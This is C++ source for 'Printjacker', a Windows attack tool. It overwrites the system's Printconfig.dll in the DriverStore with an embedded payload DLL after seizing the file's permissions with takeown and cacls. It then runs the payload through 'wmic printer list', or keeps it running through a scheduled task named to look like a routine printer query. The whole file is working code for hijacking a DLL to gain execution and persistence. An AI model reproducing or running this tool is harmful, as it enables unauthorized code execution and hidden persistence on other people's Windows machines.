#include <Windows.h>
#include <stdio.h>
#include <iostream>
#include <fstream>
#include "resource.h"

#pragma warning(disable:4996)

BOOL GetDriverDirectory(wchar_t* drvDir) {
	WIN32_FIND_DATA FindFileData;
	HANDLE hFind;
	hFind = FindFirstFile(
		L"C:\\Windows\\System32\\DriverStore\\FileRepository\\prnms003.inf_amd64*", 
		&FindFileData);
	wchar_t BeginPath[MAX_PATH] = 
		L"c:\\windows\\system32\\DriverStore\\FileRepository\\";
	wchar_t PrinterDriverFolder[MAX_PATH] = {};
	wchar_t EndPath[23] = L"\\Amd64";
	wmemcpy(PrinterDriverFolder, FindFileData.cFileName, 
		wcslen(FindFileData.cFileName));
	FindClose(hFind);
	wcscat(BeginPath, PrinterDriverFolder);
	wcscat(BeginPath, EndPath);
	wmemcpy(drvDir, BeginPath, wcslen(BeginPath));
	return TRUE; 
}

DWORD ChangePermissions(LPWSTR targetFile) {
	//takeown /r /f [DIR]\Printconfig.dll
	WCHAR cmdline1[MAX_PATH] = L"C:\\Windows\\System32\\takeown.exe /r /f ";
	wcscat(cmdline1, targetFile);
	//printf("\n[+] Trying to execute: %ws", cmdline1);
	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi;
	CreateProcess(nullptr, cmdline1, nullptr, 
		nullptr, FALSE, 0, nullptr, nullptr, &si, &pi);
	WaitForSingleObject(pi.hProcess, INFINITE);

	//cacls [DIR]\Printconfig.dll /e /p Administrators:F
	ZeroMemory(&si, sizeof(si));
	ZeroMemory(&pi, sizeof(pi));
	WCHAR cmdline2[MAX_PATH] = L"C:\\Windows\\System32\\cacls.exe ";
	wcscat(cmdline2, targetFile);
	wcscat(cmdline2, L" /e /p Administrators:F");
	//printf("\n[+] Trying to execute: %ws", cmdline2);
	CreateProcess(nullptr, cmdline2, nullptr, 
		nullptr, FALSE, 0, nullptr, nullptr, &si, &pi);
	WaitForSingleObject(pi.hProcess, INFINITE);
	DWORD result = -1;
	GetExitCodeProcess(pi.hProcess, &result);
	return result;
}


DWORD ModifyPrinterConfig(wchar_t* targetDir) {
	//https://stackoverflow.com/questions/3023762/how-to-add-a-text-file-as-resource-in-vc-2005
	HRSRC hRes = FindResource(
		GetModuleHandle(NULL), MAKEINTRESOURCE(IDR_FILE1), L"FILE");
	DWORD dwSize = SizeofResource(GetModuleHandle(NULL), hRes);
	HGLOBAL hGlob = LoadResource(GetModuleHandle(NULL), hRes);
	const char* pDll = (const char*)LockResource(hGlob);
	printf("\n\n[+] Resource is found. Trying to modify the target file...");

	WCHAR targetFile[MAX_PATH] = { 0 };
	WCHAR origFile[MAX_PATH] = { 0 };
	wcscat(targetFile, targetDir);
	wcscat(targetFile, L"\\Printconfig.dll");
	wcscat(origFile, targetDir);
	wcscat(origFile, L"\\Printconfig_orig.dll");
	if (!CopyFile(targetFile, origFile, TRUE)) {
		if (GetLastError() != ERROR_FILE_EXISTS) {
			printf("\n[-] Failed to CopyFile(): %d", GetLastError());
			return -1;
		}
		printf("\n[*] Printconfig_orig.dll is found. Continuing without overwriting");
	}
	else printf("\n[+] Original Dll is copied to Princonfig_orig.dll");
	HANDLE hFile = CreateFile(targetFile, GENERIC_WRITE, 
		0, NULL, TRUNCATE_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		printf("\n[-] Failed to open Printconfig.dll for writing: %d", GetLastError());
		goto Cleanup;
	}
	DWORD dwBytesWritten;
	if (!WriteFile(hFile, pDll, dwSize, &dwBytesWritten, NULL)) {
		printf("\n[-] Failed to write resource data into the target: %d", GetLastError());
		goto Cleanup;
	}
	printf("\n[+] Printconfig.dll is successfully modified!");
	CloseHandle(hFile);
	return 0;
	
Cleanup:
	CloseHandle(hFile);
	return -1;
}

BOOL RestorePrinterConfig(wchar_t* targetDir) {
	WCHAR targetFile[MAX_PATH] = { 0 };
	WCHAR origFile[MAX_PATH] = { 0 };
	wcscat(targetFile, targetDir);
	wcscat(targetFile, L"\\Printconfig.dll");
	wcscat(origFile, targetDir);
	wcscat(origFile, L"\\Printconfig_orig.dll");

	if (!CopyFile(origFile, targetFile, FALSE)) {
		printf("\n[-] Failed to restore Printconfig.dll: %d", GetLastError());
		return -1;
	}
	printf("\n[+] Printconfig.dll is restored from Printconfig_orig.dll");

	if (!DeleteFile(origFile)) {
		printf("\n[-] Failed to delete Printconfig_orig.dll: %d", GetLastError());
		return -1;
	}
	return true;
}

int wmain(int argc, wchar_t* argv[]) {
	printf("# Printjacker - Hijack Printconfig.dll");
	printf("\n# Author: millers-crossing");
	printf("\n-------------------------------------------------");

	BOOL isFind=false, isHijack=false, 
		isExecute=false, isSchedule=false, isRestore=false;

	if (argc < 2) {
		printf("\n[+] Usage: printjacker.exe [-find] | [-hijack] | [-execute] | [-schedule] | [-restore]");
		return 0;
	}

	if (!wcscmp(argv[1], L"-find")) isFind = true;
	else if (!wcscmp(argv[1], L"-hijack")) isHijack = true;
	else if (!wcscmp(argv[1], L"-execute")) isExecute = true;
	else if (!wcscmp(argv[1], L"-schedule")) isSchedule = true;
	else if (!wcscmp(argv[1], L"-restore")) isRestore = true;
	else {
		printf("\n[-] Failed to parse parameter. Exiting...");
		return -1;
	}

	wchar_t PrinterConfigDir[MAX_PATH] = {};
	if (!GetDriverDirectory(PrinterConfigDir)) {
		printf("\n[-] PrinterConfig.dll cannot be found.");
		return -1;
	}
	printf("\n[*] PrintConfig.dll is found: %ws", PrinterConfigDir);

	if (isFind) {
		return 0;
	}
	else if (isRestore) {
		if (!RestorePrinterConfig(PrinterConfigDir)) {
			printf("\n[-] Check if you have enough privileges or Printconfig.dll is used by other processes");
		}
		printf("\n");
		return 0;
	}

	if (ChangePermissions(PrinterConfigDir) != 0) {
		printf("\n[-] Failed to change permissions for the directory: %d", GetLastError());
		printf("\n[-] If you have enough privileges, another process may be using Printconfig.dll");
		return -1;
	}

	//Cautionary Sleep
	Sleep(3000);
	if (ModifyPrinterConfig(PrinterConfigDir)!=0) {
		return -1;
	}

	if (isHijack) {
		printf("\n[+] Hijack mode succeeded!");
		printf("\n[*] Exiting without executing payload");
		printf("\n[*] To execute use \"wmic printer list\"");
		return 0;
	}

	if (isExecute) {
		printf("\n[*] Working in Execute mode");
		printf("\n[*] Trying to execute payload by using \"wmic printer list\"...\n");
		//Run wmic printer list 
		STARTUPINFO si = { sizeof(si) };
		PROCESS_INFORMATION pi; 
		WCHAR cmdline[MAX_PATH] = L"C:\\windows\\system32\\wbem\\wmic.exe printer list";
		CreateProcess(0, cmdline, nullptr, nullptr, 0, 0, nullptr, nullptr, &si, &pi);
		Sleep(3000);
		return 0;
	}
	else if (isSchedule) {
		printf("\n[*] Working in Schedule mode");
		printf("\n[*] Trying to add \"wmic printer list\" to scheduled tasks...\n");
		STARTUPINFO si = { sizeof(si) };
		PROCESS_INFORMATION pi; 
		//Change schedule time accordingly
		WCHAR cmdline[MAX_PATH] = 
			L"schtasks.exe /create /sc HOURLY /tn \"Windows Printer Query\" /tr \"%windir%\\system32\\wbem\\wmic.exe printer list\" /mo 5 /F";
		CreateProcess(0, cmdline, nullptr, nullptr, 0, 0, nullptr, nullptr, &si, &pi);
		WaitForSingleObject(pi.hProcess, INFINITE);
		return 0;
	}

	return 0;
}